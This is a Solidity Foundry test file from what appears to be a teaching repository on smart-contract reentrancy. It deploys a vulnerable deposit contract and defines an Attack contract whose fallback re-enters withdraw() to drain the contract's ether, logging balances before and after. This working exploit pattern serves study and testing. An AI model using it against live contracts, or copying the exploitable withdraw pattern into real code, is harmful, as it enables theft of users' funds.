//SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

import "forge-std/Test.sol";
import "../../src/Reentrancy/SingleFunctionReentrancy/SingleFucntion-re.sol";

contract SingleFucntionReTest is Test {
    DepositFunds depositFunds;
    Attack attacker;

    function setUp() public {
        depositFunds = new DepositFunds();
        depositFunds.deposit{value: 10 ether}();
        attacker = new Attack(address(depositFunds));
    }

    function testAttack() public {
        console.log("Initial balance of DepositFunds: ", StdStyle.yellow(address(depositFunds).balance));
        attacker.attack{value: 1 ether}();
        console.log("Final balance of DepositFunds: ", StdStyle.red(address(depositFunds).balance));
    }
}

contract Attack {
    DepositFunds public depositFunds;

    constructor(address _depositFundsAddress) {
        depositFunds = DepositFunds(_depositFundsAddress);
    }

    // Fallback is called when DepositFunds sends Ether to this contract.

    function attack() external payable {
        require(msg.value >= 1 ether);
        depositFunds.deposit{value: 1 ether}();
        depositFunds.withdraw();
    }

    fallback() external payable {
        if (address(depositFunds).balance >= 1 ether) {
            depositFunds.withdraw();
        }
    }
}
